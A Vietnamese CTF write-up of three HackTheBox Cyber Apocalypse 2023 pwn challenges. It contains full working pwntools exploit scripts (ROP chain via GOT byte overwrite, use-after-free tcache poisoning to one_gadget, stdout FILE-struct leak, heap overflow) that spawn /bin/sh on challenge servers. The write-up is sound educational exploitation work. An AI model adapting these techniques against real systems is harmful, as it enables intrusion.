---
title: 'HackTheBox - Cyber Apocalypse 2023'
categories:
  - Pwnable
tags:
  - Pwn
  - HTB
published: true
date: 2023-03-23
---

# HackTheBox - Cyber Apocalypse 2023

<center>
    <p>
        1 tuần tryhard cùng CLB 🐸
    </p>
    <img src="https://i.imgur.com/rWhWqTT.png" >
</center>

Dưới đây sẽ là write-up vài câu pwn mức độ medium và hard trong giải này.

## Void
![](https://i.imgur.com/emzzaiH.png)

Chương trình đơn giản là read data vào buffer rồi kết thúc. Không có hàm nào để in data ra.

![](https://i.imgur.com/wz28zoQ.png)

Cách làm mình suy nghĩ đầu tiên là ghi đè một byte của read@got từ `0x80` -> `0x8c` , khi gọi lại read@plt ta tới được opcode `syscall` với `rax=1` (vì hàm read trước đó trả về 1).
Payload:
```python
# ....padding ....
p64(rsi_r15_ret)+p64(e.got.read)+p64(0)+ # đã có rdi=0 ở hàm vuln
p64(e.plt.read)+
p64(rdi_ret)+p64(1) # call write(1,e.got.read,...)
```
Sau khi trigger call write_syscall , mình muốn `$rax=0` lại để trigger call read_syscall ( để có thể ghi đè vào read_got lại).
Mình chỉ thấy đoạn code ở main+20 là phù hợp nhất để ép `$rax=0` lại:
```x86asm
pwndbg> x/3i main+20
   0x401157 <main+20>:	mov    eax,0x0
   0x40115c <main+25>:	leave  
   0x40115d <main+26>:	ret
```
Tuy nhiên lại bị dính opcode `leave; ret`. 

Nhớ rằng sau khi trigger call write_syscall thì vẫn còn `$rsi=read@got`, nên mình sẽ để `saved_rbp=read@got-8`, khi `leave` ta được `$rsp=read@got` -> hàm `main` return về `read@plt`. 

Lúc này  `read_syscall` được gọi ra, nó sẽ tự ghi đè chính return address của nó ( vì có `$rsi=read@got`, `$rsp=read@got+8`).

Final script:
```python
from pwn import *
from time import sleep
context.binary=e=ELF("./void")
libc=e.libc
def start():
    if args.LOCAL:
        p=e.process()
        if args.GDB:
            gdb.attach(p,gdbscript="""
            b *vuln+32
            b *main+25
            """)
            pause()
    elif args.REMOTE:
            p=remote(args.HOST,int(args.PORT))
    return p
rdi_ret=0x00000000004011bb
rsi_r15_ret=0x00000000004011b9
p=start()
p.sendline(b"A"*64+p64(e.got.read-8)+
           p64(rsi_r15_ret)+p64(e.got.read)+p64(0)+
           p64(e.plt.read)+
           p64(rdi_ret)+p64(1)+
           p64(e.plt.read)+
           p64(rdi_ret)+p64(0)+
           p64(e.sym.main+20)
)
sleep(1)
p.send(b"\x8c")
libc.address=u64(p.recv(8))-(libc.sym.read+12)
p.recv()
log.info(f"libc @ {hex(libc.address)}")
rdx_ret=0x00000000000c8acd+libc.address
p.sendline(p64(0)+
           p64(rdi_ret)+p64(next(libc.search(b"/bin/sh")))+
           p64(rsi_r15_ret)+p64(0)+p64(0)+
           p64(rdx_ret)+p64(0)+
           p64(libc.sym.execve))
p.interactive()
```

## Math Door

Use after free:
```c
void delete()
{
  unsigned int v0; // [rsp+Ch] [rbp-4h]

  puts("Hieroglyph index:");
  v0 = read_int();
  if ( v0 < counter )
    free((void *)chunks[v0]);
  else
    puts("That hieroglyph doens't exist.");
}
```

Reverse hàm math:
```c
unsigned __int64 math()
{
  _BYTE v1[12]; // [rsp+Ch] [rbp-24h] BYREF
  __int64 v2; // [rsp+18h] [rbp-18h]
  __int64 v3; // [rsp+20h] [rbp-10h]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  *(_DWORD *)&v1[8] = 0;
  v2 = 0LL;
  v3 = 0LL;
  puts("Hieroglyph index:");
  *(_QWORD *)v1 = (unsigned int)read_int();
  if ( *(_DWORD *)v1 <= (unsigned int)counter )
  {
    puts("Value to add to hieroglyph:");
    read(0, &v1[4], 0x18uLL);
    *(_QWORD *)chunks[*(unsigned int *)v1] += *(_QWORD *)&v1[4];
    *(_QWORD *)(chunks[*(unsigned int *)v1] + 8LL) += v2;
    *(_QWORD *)(chunks[*(unsigned int *)v1] + 16LL) += v3;
  }
  else
  {
    puts("That hieroglyph doens't exist.");
  }
  return __readfsqword(0x28u) ^ v4;
}
```
1. 4 bytes đầu tiên của v1 -> lưu index, check counter.
2. 8 bytes tiếp theo của v1 cùng với v2, v3 -> xử lý như mảng `__int64[3]` đọc `read(0, &v1[4], 0x18uLL);`
3. Xử lý chunks như `long**`:
```c
        (long **)chunks[idx][0]+= *(long *)&v1[4];
        (long **)chunks[idx][1]+= v2;
        (long **)chunks[idx][2]+= v3;
```
Chương trình xử lý theo dạng cộng/trừ nên ta không cần leak memory, chỉ cần ép có unsorted bin trên heap rồi cộng/trừ thêm offset từ &main_arena.top đến các libc function pointer cần ghi đè.

### Cách 1: Leakless
[Hàm puts có gọi tới một abs@got trỏ tới strlen: ](https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/ioputs.c#L35)
```x86asm
pwndbg> x/10i puts
   0x7f5203fe6420 <__GI__IO_puts>:	endbr64 
   0x7f5203fe6424 <__GI__IO_puts+4>:	push   r14
   0x7f5203fe6426 <__GI__IO_puts+6>:	push   r13
   0x7f5203fe6428 <__GI__IO_puts+8>:	push   r12
   0x7f5203fe642a <__GI__IO_puts+10>:	mov    r12,rdi
   0x7f5203fe642d <__GI__IO_puts+13>:	push   rbp
   0x7f5203fe642e <__GI__IO_puts+14>:	push   rbx
   0x7f5203fe642f <__GI__IO_puts+15>:	call   0x7f5203f84460 <*ABS*+0x9f630@plt>
   0x7f5203fe6434 <__GI__IO_puts+20>:	mov    r13,QWORD PTR [rip+0x167b0d]        # 0x7f520414df48
   0x7f5203fe643b <__GI__IO_puts+27>:	mov    rbx,rax
pwndbg> x/3i 0x7f5203f84460
   0x7f5203f84460 <*ABS*+0x9f630@plt>:	endbr64 
   0x7f5203f84464 <*ABS*+0x9f630@plt+4>:	bnd jmp QWORD PTR [rip+0x1c9c3d]        # 0x7f520414e0a8 <*ABS*@got.plt>
   0x7f5203f8446b <*ABS*+0x9f630@plt+11>:	nop    DWORD PTR [rax+rax*1+0x0]

   0x7f5203f8446b <*ABS*+0x9f630@plt+11>:	nop    DWORD PTR [rax+rax*1+0x0]
```
Nên mình sẽ ghi đè got này tới one_gadget.
```c 
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```
Tất nhiên đoán trước hàm puts sẽ khó có các thanh ghi nào thoả mãn một one_gadget nên mình kiểm tra các thanh ghi trước khi jmp tới got.

Mình thử để tcachebin[0]=got-0x10 ghi đè got thành system rồi kiểm tra

```x86asm
 RAX  0x0
 RBX  0x55b98b4e3620 (__libc_csu_init) ◂— endbr64 
*RCX  0x7f77d944f0a8 (*ABS*@got.plt) —▸ 0x7f77d92b5290 (system) ◂— endbr64 
*RDX  0x7f77d93eb6d0 (__strlen_avx2) ◂— endbr64 
*RDI  0x55b98b4e41b8 ◂— '1. Create \n2. Delete \n3. Add value \nAction: '
*RSI  0x130
*R8   0x1c
 R9   0x0
 R10  0x7f77d93feac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
 R11  0x246
*R12  0x55b98b4e41b8 ◂— '1. Create \n2. Delete \n3. Add value \nAction: '
 R13  0x7fffa224a120 ◂— 0x1
 R14  0x0
 R15  0x0
*RBP  0x7fffa224a030 ◂— 0x0
*RSP  0x7fffa2249fe8 —▸ 0x7f77d92e7434 (puts+20) ◂— mov r13, qword ptr [rip + 0x167b0d]
*RIP  0x7f77d92b5290 (system) ◂— endbr64 
────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────
 ► 0x7f77d92b5290 <system>          endbr64 
   0x7f77d92b5294 <system+4>        test   rdi, rdi
   0x7f77d92b5297 <system+7>        je     system+16                <system+16>

```
```x86asm
pwndbg> tele 0x7f77d944f098
00:0000│     0x7f77d944f098 (*ABS*@got.plt) —▸ 0x7f77d93e7950 (__memrchr_avx2) ◂— endbr64 
01:0008│     0x7f77d944f0a0 (__tunable_get_val@got.plt) ◂— 0x0
02:0010│ rcx 0x7f77d944f0a8 (*ABS*@got.plt) —▸ 0x7f77d92b5290 (system) ◂— endbr64 
03:0018│     0x7f77d944f0b0 (*ABS*@got.plt) —▸ 0x7f77d93eb0e0 (__strchr_avx2) ◂— endbr64 
04:0020│     0x7f77d944f0b8 (*ABS*@got.plt) —▸ 0x7f77d93e6960 (__strpbrk_sse42) ◂— endbr64 
05:0028│     0x7f77d944f0c0 (*ABS*@got.plt) —▸ 0x7f77d93e0890 (__wcscpy_ssse3) ◂— endbr64 
06:0030│     0x7f77d944f0c8 (*ABS*@got.plt) —▸ 0x7f77d93eead0 (__wmemset_avx2_unaligned) ◂— endbr64 
07:0038│     0x7f77d944f0d0 (*ABS*@got.plt) —▸ 0x7f77d93eead0 (__wmemset_avx2_unaligned) ◂— endbr64 
```
Để ý thanh `$rdx`, nó chính là giá trị got cũ trước khi bị ta ghi đè.

Nên mình đoán, khi pop `tcachebin[0]` ra, ta luôn được `$rdx = *(QWORD *)(tcachebin[0]+0x10)`.

Mình muốn `$rdx=0` để thoả one_gadget thì phải ép  `*(QWORD *)(tcachebin[0]+0x10)=0`, tuy nhiên do chưa leak libc nên ta không biết phải cộng offset/trừ bao nhiêu cho nó bằng 0.

Để ý ở trên, ta có `*(QWORD *)(tcachebin[0]+0x8)=0`, mình đoán là do libc clear đi key của tcachebin trước khi pop.

Đây là chiến thuật mình nghĩ ra: 
```
got_target + 0x00|  .....  <--- tcachebin[1]
got_target + 0x08|  .....  <--- tcachebin[0]
got_target + 0x10|  .....
got_target + 0x18|  .....
got_target + 0x20|  .....
```
Đầu tiên khi pop `tcachebin[0]` ta sẽ được `*(QWORD *)(got_target + 0x10)=0` , khi pop `tcachebin[1]`, ta sẽ có `$rdx = *(QWORD *)(got_target + 0x10)=0` :D.

Giờ mình muốn `$rsi=0` để thoả mãn one_gadget `0xe3b04`, sau một hồi mò mẫm, mình thấy được đoạn code hữu ích.

```x86asm
pwndbg> x/3i 0x7f0a75cd9deb
   0x7f0a75cd9deb <__libc_calloc+731>:	xor    esi,esi
   0x7f0a75cd9ded <__libc_calloc+733>:	call   0x7f0a75c60560 <*ABS*+0xa0540@plt>
   0x7f0a75cd9df2 <__libc_calloc+738>:	mov    r8,rax
pwndbg> x/2i 0x7f0a75c60560
   0x7f0a75c60560 <*ABS*+0xa0540@plt>:	endbr64 
   0x7f0a75c60564 <*ABS*+0xa0540@plt+4>:	bnd jmp QWORD PTR [rip+0x1c9bbd]        # 0x7f0a75e2a128 <*ABS*@got.plt>
pwndbg> x/a 0x7f0a75e2a128
0x7f0a75e2a128 <*ABS*@got.plt>:	0x7f0a75dc9b60 <__memset_avx2_unaligned_erms>
```

Vậy là cuối cùng ta chỉ cần ghi đè
```
got_calloc_call = one_gadget
got_puts_call =  __libc_calloc+731
```
Bạn có thể debug script của mình để rõ hơn:

```python
from pwn import *
from pwn import time
#pwndbg> x/3i 0x7f0a75cd9deb
#   0x7f0a75cd9deb <__libc_calloc+731>:	xor    esi,esi
#   0x7f0a75cd9ded <__libc_calloc+733>:	call   0x7f0a75c60560 <*ABS*+0xa0540@plt>
#   0x7f0a75cd9df2 <__libc_calloc+738>:	mov    r8,rax
#pwndbg> x/2i 0x7f0a75c60560
#   0x7f0a75c60560 <*ABS*+0xa0540@plt>:	endbr64 
#   0x7f0a75c60564 <*ABS*+0xa0540@plt+4>:	bnd jmp QWORD PTR [rip+0x1c9bbd]        # 0x7f0a75e2a128 <*ABS*@got.plt>
#pwndbg> x/a 0x7f0a75e2a128
#0x7f0a75e2a128 <*ABS*@got.plt>:	0x7f0a75dc9b60 <__memset_avx2_unaligned_erms>

e=ELF('./math-door')
libc=e.libc
if args.LOCAL:
    io = e.process()
elif args.REMOTE:
    io=remote("165.232.98.11",32017) #165.232.98.11:32017
def c(recv_newline=True):
    if recv_newline:
        io.sendlineafter(b'Action: \n', b'1')
    else:
        io.sendlineafter(b'Action: ', b'1')
def d(idx,recv_newline=True):
    if recv_newline:
        io.sendlineafter(b'Action: \n', b'2')
        io.sendlineafter(b'index:\n', str(idx).encode('utf-8'))
    else:
        io.sendlineafter(b'Action:', b'2')
        io.sendlineafter(b'index:', str(idx).encode('utf-8'))
def a(idx, dat,recv_newline=True):
    if recv_newline:
        io.sendlineafter(b'Action: \n', b'3')
        io.sendlineafter(b'index:\n', str(idx).encode('utf-8'))
        io.sendafter(b'hieroglyph:\n', dat)
    else:
        io.sendlineafter(b'Action: ', b'3')
        io.sendlineafter(b'index:', str(idx).encode('utf-8'))
        io.sendafter(b'hieroglyph:', dat)

def pwn(dbg = 0):
    if dbg:
        gdb.attach(io,gdbscript="""
        set follow-fork-mode parent
        set $glibc_src_dir = "./glibc-2.31/"
        source ~/add_src.py
        b execve
        b *__libc_calloc+731
        """)
    for i in range(35):
        c()
    d(0)
    a(0, p64(0x10)+b'A')
    d(0)
    a(0, b'\x10')
    c()
    c()
    sleep(1)
    a(36, p64(0)+p64(0x21))
    d(10)
    d(1)
    a(36, p64(0)+p64(0x400))
    d(1)
    a(1,p64(0xfffffffffffff548))
    c()
    c()
    a(38,p64(0xfffffffffff57fa4))
    d(6)
    d(5)
    d(4)
    a(4,p64(0xffffffffffffff80))
    a(1,p64(0xffffffffffffff88))
    c()
    c()
    c()
    a(41,p64(0)+p64(0)) # rdx = *(qword *)(&tachebin[0]+0x10)
    d(9)
    d(8)
    d(7)
    a(7,p64(0xffffffffffffff20))
    a(1,p64(0xfffffffffffffff8))
    c()
    c()
    c()
    a(44,p64(0xfffffffffff1371b))
    io.interactive()
pwn()
```
### Cách 2: Leak ELF, Libc...

Cách này gần giống như cách trên, [để ý rằng hàm puts gọi strlen để tính độ dài cho chuỗi in ra](https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/ioputs.c#L32), nếu ta ghi đè got đó thành hàm system ,
khi gọi `puts("1. Create \n2. Delete \n3. Add value \nAction: ")`
-> `system("1. Create \n2. Delete \n3. Add value \nAction: ")` ->
system trả về số âm làm cho len rất lớn, để ý chuỗi đang ở trên .data của ELF -> leak được ELF.

Rất tiếc là cách này không chạy được trên remote :(.

Payload:
```python
    for i in range(35):
        c()
    d(0)
    a(0, p64(0x10)+b'A')
    d(0)
    a(0, b'\x10')
    c()
    c()
    a(36, p64(0)+p64(0x21))
    d(10)
    d(1)
    a(36, p64(0)+p64(0x400))
    d(1)
    a(36,p64(0)+p64(0)+p64(0xfffffffffffff4b0+8))
    pause()
    c()
    c()
    a(38,p64(0)+p64(0)+p64(0xffffffffffec9bc0))
    pause()
    io.recvuntil(b"Can you math your way through?"+b"\x00"*6)
    io.recv(0x00000dd0)
    io.recv(1)
    libc.address=u64(io.recv(8))-libc.sym.free
    log.info(f"libc @ {hex(libc.address)}")
    for i in range(4):
        io.recv(0xfff)
    sleep(1)
    io.sendline(b"3\x00")
    sleep(1)
    io.sendline(b"38"+b"\x00"*28)
    sleep(1)
    io.sendline(p64(0)+p64(0)+p64(1270848))
    sleep(1)
    d(12)
    d(11)
    d(4)
    a(4,p64(0xfffffffffffffec0)+p64(0)*2)
    a(1,p64(0x2db0)+p64(0)+p64(0))
    c()
    c()
    c()
    a(0x29,p64(libc.sym.system)+p64(0)*2)
    a(9,b"/bin/sh\x00"+p64(0)+p64(0))
    d(9)
    io.interactive()
pwn()
```
### Cách 3: Ghi đè stdout

Ghi đè: 
```c
stdout->flags=IO_MAGIC | _IO_CURRENTLY_PUTTING | _IO_IS_APPENDING`
stdout->_IO_write_base=_IO_2_1_stdout_+128
stdout->_IO_write_ptr=_IO_2_1_stdout_+144
/*
--> trigger call _IO_new_file_overflow(f,EOF)
--> trigger call _IO_do_write (f, f->_IO_write_base,
                f-_IO_write_ptr - f->_IO_write_base);
*/
```

```x86asm
00:0000│ rsi 0x7f2f08465720 (_IO_2_1_stdout_+128) ◂— 0xa000000
01:0008│     0x7f2f08465728 (_IO_2_1_stdout_+136) —▸ 0x7f2f084667e0 (_IO_stdfile_1_lock) ◂— 0x100000001
02:0010│     0x7f2f08465730 (_IO_2_1_stdout_+144) ◂— 0xffffffffffffffff
03:0018│     0x7f2f08465738 (_IO_2_1_stdout_+152) ◂— 0x0
04:0020│     0x7f2f08465740 (_IO_2_1_stdout_+160) —▸ 0x7f2f08464880 (_IO_wide_data_1) ◂— 0x0
05:0028│     0x7f2f08465748 (_IO_2_1_stdout_+168) ◂— 0x0

```
-> Leak _IO_stdfile_1_lock.
Script:
```python
from pwn import *
from pwn import time
#file struct attack
e=ELF('./math-door')
libc=e.libc
if args.LOCAL:
    io = e.process()
elif args.REMOTE:
    io=remote("165.232.108.36",30648) #165.232.108.36:30648
def c(recv_newline=True):
    if recv_newline:
        io.sendlineafter(b'Action: \n', b'1')
    else:
        io.sendlineafter(b'Action: ', b'1')
def d(idx,recv_newline=True):
    if recv_newline:
        io.sendlineafter(b'Action: \n', b'2')
        io.sendlineafter(b'index:\n', str(idx).encode('utf-8'))
    else:
        io.sendlineafter(b'Action:', b'2')
        io.sendlineafter(b'index:', str(idx).encode('utf-8'))
def a(idx, dat,recv_newline=True):
    if recv_newline:
        io.sendlineafter(b'Action: \n', b'3')
        io.sendlineafter(b'index:\n', str(idx).encode('utf-8'))
        io.sendafter(b'hieroglyph:\n', dat)
    else:
        io.sendlineafter(b'Action: ', b'3')
        io.sendlineafter(b'index:', str(idx).encode('utf-8'))
        io.sendafter(b'hieroglyph:', dat)

def pwn(dbg = 1):
    if dbg:
        gdb.attach(io,gdbscript="""
        set follow-fork-mode parent
        set $glibc_src_dir = "./glibc-2.31/"
        source ~/add_src.py
        b execve
        """)
    for i in range(35):
        c()
    d(0)
    a(0, p64(0x10)+b'A')
    d(0)
    a(0, b'\x10')
    c()
    c()
    sleep(1)
    a(36, p64(0)+p64(0x21))
    d(10)
    d(1)
    a(36, p64(0)+p64(0x400))
    d(1)
    a(1,p64(0xad8)+p64(0)*2)
    c()
    c() #38
    #a(38,p64(0)+p64(0xfffffffffffffffd)+p64(0xd))
    sleep(1)
    d(6)
    d(5)
    d(4)
    a(4,p64(0xffffffffffffff80)+p64(0)*2)
    a(1,p64(0xffffffffffffffe8))
    sleep(1)
    c()
    c()
    c() #41
    sleep(1)
    a(38,p64(0)+p64(0xfffffffffffffffd)+p64(0xd))
    #a(41,p64(0xffffffffffffef79))
    io.sendline(b"3")
    io.sendline(b"41")
    sleep(1)
    sleep(1)
    pause()
    io.send(p64(0xffffffffffffef79)+p64(0)*2)
    pause()
    io.recv(8)
    libc.address=u64(io.recv(8))-libc.sym._IO_stdfile_1_lock
    log.info(f"libc @ {hex(libc.address)}")
    d(22,False)
    d(21,False)
    d(20,False)
    a(20,p64(0xfffffffffffffd80),False)
    a(1,p64(0x17a8),False)
    c(False)
    c(False)
    c(False)
    a(44,p64(libc.sym.system),False)
    a(23,b"/bin/sh\x00",False)
    d(23,False)
    io.interactive()
pwn()
```
Không biết có phải do cố ý hay không , nhưng chỉ có cách 1 là không cần leak memory là chạy trên remote được.

## Runic

Mình định nghĩa `struct Rune`:
```c
struct Rune{
    char name[8];
    char *info;
    unsigned int size;
    //4 bytes padding.
};
```
Reverse hàm create():
```c
// struct Rune *[64] MainTable;
// struct Rune[64] items;
//
int setup()
{
  Rune **v0; // rax
  int i; // [rsp+Ch] [rbp-4h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  LODWORD(v0) = setvbuf(stderr, 0LL, 2, 0LL);
  for ( i = 0; i <= 0x3F; ++i )
  {
    v0 = MainTable;
    MainTable[i] = &items[i];
  }
  return (int)v0;
};
unsigned __int64 create()
{
  int v1; // [rsp+0h] [rbp-20h]
  unsigned int nbytes; // [rsp+4h] [rbp-1Ch]
  char *info_; // [rsp+8h] [rbp-18h]
  char name[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  *(_QWORD *)name = 0LL;
  puts("Rune name: ");
  read(0, name, 8uLL);
  v1 = hash(name);
  if ( MainTable[(unsigned int)hash(name)]->info )
  {
    puts("That rune name is already in use!");
  }
  else
  {
    puts("Rune length: ");
    nbytes = read_int();
    if ( nbytes <= 0x60 )
    {
      info_ = (char *)malloc(nbytes + 8);
      strcpy(MainTable[v1]->name, name);
      MainTable[v1]->info = info_;
      MainTable[v1]->size = nbytes;
      strcpy(info_, name);
      puts("Rune contents: ");
      read(0, info_ + 8, nbytes);
    }
    else
    {
      puts("Max length is 0x60!");
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

Hàm `create`:
1. Đọc 8 byte của `name` rồi đưa vào hàm `hash` để lấy index.
2. Allocate `info` với `malloc(size+8)`, 8 byte đầu của info sẽ được copy từ `name` sang bằng hàm `strcpy`
3. Đọc contents từ `info+8` trở đi.
-> Potential bug: `info.name` có thể khác `Rune.name` .

Revese hàm `edit`:
```c
unsigned __int64 edit()
{
  int new_idx; // eax
  void *old_data; // rbx
  int new_idx_; // eax
  int old_idx; // eax
  int vuln_idx; // eax
  char *old_info; // [rsp+0h] [rbp-30h]
  char old_name[8]; // [rsp+8h] [rbp-28h] BYREF
  char new_name[8]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v9; // [rsp+18h] [rbp-18h]

  v9 = __readfsqword(0x28u);
  *(_QWORD *)old_name = 0LL;
  *(_QWORD *)new_name = 0LL;
  puts("Rune name: ");
  read(0, old_name, 8uLL);
  old_info = MainTable[(unsigned int)hash(old_name)]->info;
  if ( old_info )
  {
    puts("New name: ");
    read(0, new_name, 8uLL);
    if ( MainTable[(unsigned int)hash(new_name)]->info )
    {
      puts("That rune name is already in use!");
    }
    else
    {
      new_idx = hash(new_name);
      strcpy(MainTable[new_idx]->name, new_name);
      old_data = &MainTable[(unsigned int)hash(old_name)]->info;// 
                                                // data:
                                                //    info
                                                //    size
      new_idx_ = hash(new_name);
      memcpy(&MainTable[new_idx_]->info, old_data, 12uLL);
      strcpy(old_info, new_name);
      old_idx = hash(old_name);
      memset(MainTable[old_idx], 0, 0x14uLL);
      puts("Rune contents: ");
      vuln_idx = hash(old_info);
      read(0, old_info + 8, MainTable[vuln_idx]->size);
    }
  }
  else
  {
    puts("There's no rune with that name!");
  }
  return __readfsqword(0x28u) ^ v9;
}
```
1. Đọc old_name và new_name
2. Copy info và size từ `Maintable[hash(old_name)]` sang `Maintable[hash(new_name)]`
3. Copy `new_name` sang 8 byte đầu của chunk `info` bằng `strcpy`.
4. Clear `Maintable[hash(old_name)]`
5. Lấy index bằng 8 byte đầu của info: `vuln_idx = hash(old_info);` 
    rồi gọi `read(0, old_info + 8, MainTable[vuln_idx]->size);`

Vấn đề nằm ở bước 3, copy bằng `strcpy` khiến cho `info.name` có thể khác `Rune.name` . 

Từ đó ở bước 5, `vuln_idx` không nhất thiết bằng index của `Rune` mới khởi tạo mà có thể là `index` của `Rune` khác 
-> `MainTable[vuln_idx]->size` !=  `Rune.size`.

Ví dụ:
```python
create(p64(0),0x60,b"0"*0x60)
create(p64(0x01),0x10,b"1"*0x10)
edit(p64(0x01),p64(0x30)[::-1],b"B"*0x10+p64(0xd21))
```

Mình tạo `Rune_0` với size=0x60 và `Rune_1` với size=0x20.

Khi `edit` `Rune_1` với `new_name` là `\x00\x00\x30` thì `new_idx` sẽ là `0x30`,

nhưng do có `NULL` byte ở `new_name` nên `info.name` vẫn là `NULL` từ đó `vuln_idx=0` 

-> `read(0, Rune_1.info + 8,0x60)` trong khi `Rune_1.info` chỉ là chunk size `0x20` (heap overflow).

Tương tự như bài trước, mình ghi đè `strlen_got = system` , may mắn ở đây là hàm `show` gọi `puts(info+8)` nên mình chỉ cần tạo `Rune` có content là `/bin/sh`

Script:
```python
from pwn import *
from time import sleep
context.binary=e=ELF("./runic")
libc=e.libc
def start():
    if args.LOCAL:
        p=e.process()
        if args.GDB:
            gdb.attach(p,gdbscript="""
            """)
            pause()
    elif args.REMOTE:
            p=remote(args.HOST,int(args.PORT))
    return p
def create(name: bytes,length: int,contest: bytes):
    p.sendlineafter(b"Action: \n",b"1")
    p.sendafter(b"Rune name: \n",name)
    p.sendlineafter(b"Rune length: ",str(length).encode())
    p.sendlineafter(b"Rune contents: \n",contest)
def delete(name: bytes):
    p.sendlineafter(b"Action: \n",b"2")
    p.sendafter(b"Rune name: \n",name)
def edit(old_name: bytes,new_name: bytes,contest: bytes):
    p.sendlineafter(b"Action: \n",b"3")
    p.sendafter(b"Rune name: \n",old_name)
    p.sendafter(b"New name: \n",new_name)
    p.sendafter(b"Rune contents: \n",contest)
def show(name: bytes):
    p.sendlineafter(b"Action: \n",b"4")
    p.sendafter(b"Rune name: \n",name)
p=start()
create(p64(0),0x60,b"0"*0x60)
create(p64(0x01),0x10,b"1"*0x10)
for i in range(2,0x20):
    create(p64(i),0x60,b"X"*0x60)
create(p64(0x20),0x10,b"Y"*0x10)
edit(p64(0x01),p64(0x30)[::-1],b"B"*0x10+p64(0xd21))
delete(p64(0x2))
create(p64(0x2),0x60,b"X"*0x60)
show(p64(0x3))
p.recvuntil(b"Rune contents:\n\n")
libc.address=u64(p.recv(6)+b"\0\0")-(libc.sym.main_arena+96)
log.info(f"libc @ {hex(libc.address)}")
delete(p64(0x2))
edit(p64(0x30),p64(0x31)[::-1],b"B"*0x10+b"C"*0x8)
show(p64(0x31))
p.recvuntil(b"C"*8)
heap=u64(p.recv(5)+b"\0\0\0") << 12
log.info(f"heap @ {hex(heap)}")
target_chunk=heap+0x330
edit(p64(0x31),p64(0x1)[::-1],b"B"*0x10+p64(0x71))
create(p64(2),0x60,b"X"*0x60)
delete(p64(0x4))
delete(p64(0x2))
target_abs=libc.address+0x1f2098
edit(p64(0x1),p64(0x31)[::-1],b"B"*0x10+p64(0x71)+p64((target_chunk >> 12) ^ (target_abs-0x18)))
create(p64(2),0x60,b"/bin/sh\x00")

create(p64(4),0x60,p64(0)*2+p64(libc.sym.system))
p.sendline(b"4")
p.recv()
if args.LOCAL:
    p.interactive() # press Ctrl+C
p.sendline(p64(2))
p.interactive()
```
